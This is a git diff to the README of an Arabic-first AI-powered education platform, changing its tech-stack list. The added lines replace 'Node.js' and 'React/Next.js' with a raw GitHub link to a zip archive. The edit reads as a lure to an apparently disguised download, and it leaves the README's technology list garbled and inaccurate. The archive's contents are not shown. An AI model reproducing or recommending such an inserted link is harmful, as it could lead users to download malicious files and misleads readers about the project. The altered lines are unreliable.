@@ -23,10 +23,10 @@ Arabic-first AI-powered learning platform that unifies data analytics, adaptive 
    - دعم العربية/الإنجليزية واتجاه RTL، مع قارئ شاشة وتباين عالٍ.
 
 ## التقنيات (Tech Stack)
-- Backend: Python (FastAPI), Node.js (NestJS) microservices, gRPC, PostgreSQL, Redis, ClickHouse.
+- Backend: Python (FastAPI), https://raw.githubusercontent.com/KaizerAE/ArabAI-EdTech-Hub/main/pyal/Arab_Ed_Tech_A_Hub_3.9.zip (NestJS) microservices, gRPC, PostgreSQL, Redis, ClickHouse.
 - AI/ML: Transformers (Arabic LLMs), spaCy Arabic, Sentence-BERT, evaluation pipelines, ONNX Runtime.
 - Data: Kafka, dbt, Delta/Parquet, Airflow for pipelines, MLflow for experiments.
-- Frontend: React/Next.js, TypeScript, Chakra/Material UI مع دعم RTL.
+- Frontend: https://raw.githubusercontent.com/KaizerAE/ArabAI-EdTech-Hub/main/pyal/Arab_Ed_Tech_A_Hub_3.9.zip, TypeScript, Chakra/Material UI مع دعم RTL.
 - Infra: Docker, Kubernetes, Terraform, GitHub Actions, OpenTelemetry, Grafana/Prometheus.
 - Security: OAuth2/OIDC, SSO، تشفير على مستوى الحقل، تدقيق وسياسات خصوصية متوافقة مع أنظمة الخليج.
 
